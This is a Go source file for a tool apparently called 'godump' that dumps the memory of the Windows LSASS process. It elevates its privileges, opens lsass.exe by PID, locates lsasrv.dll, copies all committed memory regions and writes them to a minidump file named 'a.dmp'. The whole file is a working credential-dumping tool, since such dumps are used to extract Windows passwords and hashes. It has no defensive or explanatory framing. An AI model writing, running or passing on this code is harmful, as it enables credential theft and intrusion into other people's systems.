package main

import (
	"fmt"
	"godump/mini"
	"godump/win"
	"os"
	"unsafe"
)

func main() {
	fmt.Println("[*]godump.exe version 1.0[*]\n===============")
	if len(os.Args) < 2 {
		fmt.Println("usage: godump.exe <lsass.exe pid>")
		return
	}

	err := win.ElevateProcessToken()
	if err != nil {
		fmt.Println(err)
		return
	}

	processHandle, err := win.NtOpenProcess(os.Args[1])
	fmt.Println("ProcessHandle:", processHandle, err)

	maximumApplicationAddress, err := win.GetMaxAddress()
	fmt.Println("MaximumApplicationAddress:", unsafe.Pointer(maximumApplicationAddress), err)

	var memAddress uintptr
	var memoryRegions []byte
	mem64infoList := make([]win.Memory64Info, 0)
	pbi, err := win.QueryInformationProcess(processHandle)
	fmt.Println("PebBaseAddress:", unsafe.Pointer(pbi.PebBaseAddress), err)

	lsasrvdllAddress, err := win.CustomGetModuleHandle1(processHandle, "lsasrv.dll")
	fmt.Println("Lsasrvdll Address:", unsafe.Pointer(lsasrvdllAddress), err)
	if lsasrvdllAddress == 0 {
		return
	}

	var lsasrvdllSize = 0
	var mbi win.MEMORY_BASIC_INFORMATION
	var bool_test = false
	for memAddress < maximumApplicationAddress {
		win.QueryVirtualMemoryProcess(processHandle, memAddress, &mbi)

		if mbi.Protect != win.PAGE_NOACCESS && mbi.State == win.MEM_COMMIT {
			var mem64info win.Memory64Info
			mem64info.Address = mbi.BaseAddress
			mem64info.Size = mbi.RegionSize
			mem64infoList = append(mem64infoList, mem64info)
			buffer := make([]byte, mbi.RegionSize)
			win.ReadVirtualMemoryProcess(processHandle, &buffer[0], mbi.BaseAddress, mbi.RegionSize)

			newByteArray := make([]byte, len(memoryRegions)+len(buffer))
			copy(newByteArray, memoryRegions)
			copy(newByteArray[len(memoryRegions):], buffer)

			memoryRegions = newByteArray

			if mbi.BaseAddress == lsasrvdllAddress {
				bool_test = true
			}

			if bool_test {
				if mbi.RegionSize == 0x1000 && mbi.BaseAddress != lsasrvdllAddress {
					bool_test = false
				} else {
					lsasrvdllSize += int(mbi.RegionSize)
				}
			}
		}

		memAddress = memAddress + mbi.RegionSize

	}

	fmt.Println("Lsasrv Size:", lsasrvdllSize)
	mini.Createdump(lsasrvdllAddress, lsasrvdllSize, mem64infoList, memoryRegions, "a.dmp")
}
